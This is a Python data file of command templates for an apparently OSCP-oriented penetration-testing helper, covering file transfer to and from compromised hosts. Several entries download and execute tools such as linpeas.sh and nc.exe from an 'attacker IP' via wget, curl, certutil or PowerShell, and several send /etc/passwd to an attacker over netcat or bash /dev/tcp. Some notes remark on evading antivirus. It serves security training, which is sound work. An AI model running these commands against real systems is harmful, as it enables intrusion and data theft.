"""
File Transfer Alternative Commands

Manual alternatives for transferring files to/from target systems.

ADD YOUR COMMANDS HERE by copying examples from TEMPLATE.py
"""

from ..models import AlternativeCommand, Variable


# Example: Python HTTP server for file hosting
ALTERNATIVES = [
    AlternativeCommand(
        id='alt-python-http-server',
        name='Python HTTP Server',
        command_template='python3 -m http.server <PORT>',
        description='Start Python HTTP server to host files for download',
        category='file-transfer',
        subcategory='hosting',
        variables=[
            Variable(
                name='PORT',
                description='Port to listen on',
                example='8000',
                auto_resolve=True,  # Auto-resolve from config or defaults
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'LINUX', 'MANUAL'],
        os_type='linux',
        success_indicators=[
            'Serving HTTP on 0.0.0.0',
            'Server started successfully'
        ],
        failure_indicators=[
            'Address already in use',
            'Permission denied'
        ],
        next_steps=[
            'On target: wget http://<LHOST>:<PORT>/<FILE>',
            'On target: curl http://<LHOST>:<PORT>/<FILE> -o <FILE>',
            'Verify file transfer with md5sum'
        ],
        notes='Run in directory containing files to transfer. Use Ctrl+C to stop.',
        parent_task_pattern='*file-transfer*'
    ),

    # Linux file download with wget
    AlternativeCommand(
        id='alt-wget-download',
        name='wget Download File',
        command_template='wget http://<LHOST>:<LPORT>/<FILE> -O /tmp/<FILE>',
        description='Download file from HTTP server using wget (Linux/Unix)',
        category='file-transfer',
        subcategory='download',
        variables=[
            Variable(
                name='LHOST',
                description='Attacker IP (HTTP server)',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='LPORT',
                description='HTTP server port',
                example='8000',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to download',
                example='linpeas.sh',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'LINUX', 'QUICK_WIN'],
        os_type='linux',
        flag_explanations={
            '-O': 'Output filename (save to /tmp/<FILE>)',
            '/tmp/': 'Writable directory on most systems'
        },
        success_indicators=[
            '100% completion shown',
            'File saved to /tmp/',
            'HTTP 200 OK response'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'Connection refused',
            'Permission denied (try different directory)'
        ],
        next_steps=[
            'Verify file: ls -la /tmp/<FILE>',
            'Make executable: chmod +x /tmp/<FILE>',
            'Check integrity: md5sum /tmp/<FILE>'
        ],
        notes='Alternative to curl. Use -q for quiet mode in exam scripts.',
        parent_task_pattern='*file-transfer*'
    ),

    # Linux file download with curl
    AlternativeCommand(
        id='alt-curl-download',
        name='curl Download File',
        command_template='curl http://<LHOST>:<LPORT>/<FILE> -o /tmp/<FILE>',
        description='Download file from HTTP server using curl (Linux/Unix)',
        category='file-transfer',
        subcategory='download',
        variables=[
            Variable(
                name='LHOST',
                description='Attacker IP (HTTP server)',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='LPORT',
                description='HTTP server port',
                example='8000',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to download',
                example='linpeas.sh',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'LINUX', 'QUICK_WIN'],
        os_type='linux',
        flag_explanations={
            '-o': 'Output file (lowercase "o" writes to file)',
            'http://': 'Protocol (use https:// for SSL)'
        },
        success_indicators=[
            'File downloaded',
            '100% progress shown',
            'Bytes received matches file size'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'Failed to connect',
            'Could not write to /tmp/'
        ],
        next_steps=[
            'Verify file: file /tmp/<FILE>',
            'Make executable: chmod +x /tmp/<FILE>',
            'Run: /tmp/<FILE>'
        ],
        notes='curl more common than wget on minimal systems. Use -k to ignore SSL cert errors.',
        parent_task_pattern='*file-transfer*'
    ),

    # Windows certutil download (CRITICAL for OSCP)
    AlternativeCommand(
        id='alt-certutil-download',
        name='certutil Download File (Windows)',
        command_template='certutil -urlcache -split -f http://<LHOST>:<LPORT>/<FILE> C:\\Windows\\Temp\\<FILE>',
        description='Download file using certutil.exe (Windows built-in, no PowerShell needed)',
        category='file-transfer',
        subcategory='download',
        variables=[
            Variable(
                name='LHOST',
                description='Attacker IP (HTTP server)',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='LPORT',
                description='HTTP server port',
                example='8000',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to download',
                example='nc.exe',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'WINDOWS', 'QUICK_WIN'],
        os_type='windows',
        flag_explanations={
            '-urlcache': 'URL cache operation (download from URL)',
            '-split': 'Split files during transfer (required for download)',
            '-f': 'Force overwrite existing file'
        },
        success_indicators=[
            'File downloaded successfully',
            '0000... hex dump shown (indicates success)',
            'File exists in C:\\Windows\\Temp\\'
        ],
        failure_indicators=[
            'Network connection failed',
            'Access denied (try different path)',
            'AV blocks download (common with AV detection)'
        ],
        next_steps=[
            'Verify file: dir C:\\Windows\\Temp\\<FILE>',
            'Execute: C:\\Windows\\Temp\\<FILE>',
            'Alternative path if blocked: %TEMP%'
        ],
        notes='Often flagged by AV but works when PowerShell is disabled. Built-in on all Windows systems.',
        parent_task_pattern='*file-transfer*'
    ),

    # PowerShell WebClient DownloadFile
    AlternativeCommand(
        id='alt-powershell-downloadfile',
        name='PowerShell DownloadFile (Windows)',
        command_template='powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://<LHOST>:<LPORT>/<FILE>\',\'C:\\Windows\\Temp\\<FILE>\')"',
        description='Download file to disk using PowerShell WebClient (Windows)',
        category='file-transfer',
        subcategory='download',
        variables=[
            Variable(
                name='LHOST',
                description='Attacker IP (HTTP server)',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='LPORT',
                description='HTTP server port',
                example='8000',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to download',
                example='nc.exe',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'WINDOWS', 'QUICK_WIN'],
        os_type='windows',
        flag_explanations={
            '-c': 'Execute command string',
            'New-Object Net.WebClient': 'Create WebClient object for HTTP operations',
            'DownloadFile': 'Download file to disk (synchronous)',
            "'http://...'": 'Source URL (single quotes inside double quotes)'
        },
        success_indicators=[
            'File downloaded to C:\\Windows\\Temp\\',
            'Command completes without error',
            'File size matches source'
        ],
        failure_indicators=[
            'AMSI blocks execution',
            'Network connection error',
            'Path not writable'
        ],
        next_steps=[
            'Verify: dir C:\\Windows\\Temp\\<FILE>',
            'Check hash: certutil -hashfile C:\\Windows\\Temp\\<FILE> MD5',
            'Execute file'
        ],
        notes='Alternative: Invoke-WebRequest (PS v3+) or Start-BitsTransfer (stealthier, uses Windows Update infrastructure).',
        parent_task_pattern='*file-transfer*'
    ),

    # Netcat file transfer (receiver)
    AlternativeCommand(
        id='alt-nc-file-receive',
        name='Netcat Receive File',
        command_template='nc -lvnp <LPORT> > <FILE>',
        description='Receive file via netcat (listener side - typically attacker)',
        category='file-transfer',
        subcategory='netcat',
        variables=[
            Variable(
                name='LPORT',
                description='Port to listen on',
                example='4444',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to save received data',
                example='output.txt',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'MANUAL', 'BOTH_OS'],
        os_type='both',
        flag_explanations={
            '-l': 'Listen mode (wait for connection)',
            '-v': 'Verbose output (show connection details)',
            '-n': 'No DNS resolution (faster)',
            '-p': 'Port to listen on',
            '>': 'Redirect output to file'
        },
        success_indicators=[
            'Listening on port shown',
            'Connection received',
            'File saved successfully'
        ],
        failure_indicators=[
            'Port already in use',
            'Permission denied (try port > 1024)',
            'Connection timeout'
        ],
        next_steps=[
            'Sender runs: nc <LHOST> <LPORT> < file.txt',
            'Verify file: ls -la <FILE>',
            'Check integrity: md5sum <FILE>'
        ],
        notes='Pair with "nc <TARGET> <PORT> < file.txt" on sender side. Works without special tools.',
        parent_task_pattern='*file-transfer*'
    ),

    # Netcat file transfer (sender)
    AlternativeCommand(
        id='alt-nc-file-send',
        name='Netcat Send File',
        command_template='cat <FILE> | nc <TARGET> <PORT>',
        description='Send file via netcat using pipe (sender side - typically target exfiltration)',
        category='file-transfer',
        subcategory='netcat',
        variables=[
            Variable(
                name='TARGET',
                description='Receiver IP (attacker)',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='Receiver port',
                example='4444',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='FILE',
                description='Filename to send',
                example='/etc/passwd',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'MANUAL', 'BOTH_OS'],
        os_type='both',
        flag_explanations={
            'cat <FILE>': 'Read file content to stdout',
            '|': 'Pipe output to netcat',
            'nc <TARGET> <PORT>': 'Connect to receiver and send piped data'
        },
        success_indicators=[
            'Connected to receiver',
            'File sent (netcat exits)',
            'Receiver shows file received'
        ],
        failure_indicators=[
            'Connection refused',
            'File not found',
            'Network unreachable'
        ],
        next_steps=[
            'Receiver verifies: ls -la <FILE>',
            'Check integrity on both sides: md5sum <FILE>',
            'For binary files: use nc -q 0 to prevent corruption'
        ],
        notes='Receiver must run "nc -lvnp <PORT> > file.txt" first. Alternative: nc <TARGET> <PORT> < file.txt (using redirection). Works on minimal systems.',
        parent_task_pattern='*file-transfer*'
    ),

    # Base64 encode/decode transfer
    AlternativeCommand(
        id='alt-base64-transfer',
        name='Base64 Encode/Decode Transfer',
        command_template='base64 -w 0 <FILE>',
        description='Encode file to base64 for copy/paste transfer (when no network tools available)',
        category='file-transfer',
        subcategory='encoding',
        variables=[
            Variable(
                name='FILE',
                description='Filename to encode',
                example='exploit.sh',
                auto_resolve=False,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'MANUAL', 'BOTH_OS'],
        os_type='both',
        flag_explanations={
            'base64': 'Base64 encode/decode utility',
            '-w 0': 'No line wrapping (single line output)',
            '-w': 'Line wrap width (0 = no wrap)'
        },
        success_indicators=[
            'Base64 string output',
            'Single line (if using -w 0)',
            'Reversible with base64 -d'
        ],
        failure_indicators=[
            'File not found',
            'Output truncated (terminal buffer limit)'
        ],
        next_steps=[
            'Copy base64 string',
            'On target: echo "<BASE64>" | base64 -d > <FILE>',
            'Make executable: chmod +x <FILE>',
            'Verify integrity: Compare md5sum on both sides'
        ],
        notes='Useful when only SSH/RDP console available. Windows: certutil -encode/-decode. For large files, split output.',
        parent_task_pattern='*file-transfer*'
    ),

    # Bash /dev/tcp file transfer
    AlternativeCommand(
        id='alt-bash-tcp-transfer',
        name='Bash /dev/tcp File Transfer',
        command_template='cat <FILE> > /dev/tcp/<TARGET>/<PORT>',
        description='Send file using bash /dev/tcp (no nc required, pure bash)',
        category='file-transfer',
        subcategory='bash-redirect',
        variables=[
            Variable(
                name='FILE',
                description='Filename to send',
                example='/etc/passwd',
                auto_resolve=False,
                required=True
            ),
            Variable(
                name='TARGET',
                description='Receiver IP',
                example='192.168.45.113',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='Receiver port',
                example='4444',
                auto_resolve=True,
                required=True
            )
        ],
        tags=['OSCP:HIGH', 'FILE_TRANSFER', 'LINUX', 'MANUAL', 'NO_TOOLS'],
        os_type='linux',
        flag_explanations={
            '/dev/tcp/': 'Bash special device for TCP connections',
            'cat <FILE>': 'Read file and send to TCP stream'
        },
        success_indicators=[
            'File sent (command exits)',
            'Receiver gets data',
            'No errors'
        ],
        failure_indicators=[
            'Connection refused',
            '/dev/tcp not available (compiled out)',
            'Bash version too old'
        ],
        next_steps=[
            'Receiver: nc -lvnp <PORT> > file.txt',
            'Verify transfer with md5sum',
            'Download: cat < /dev/tcp/<LHOST>/<LPORT> > file.txt'
        ],
        notes='Works when nc unavailable. Requires bash (not sh/dash). /dev/tcp may be disabled in hardened systems.',
        parent_task_pattern='*file-transfer*'
    ),
]
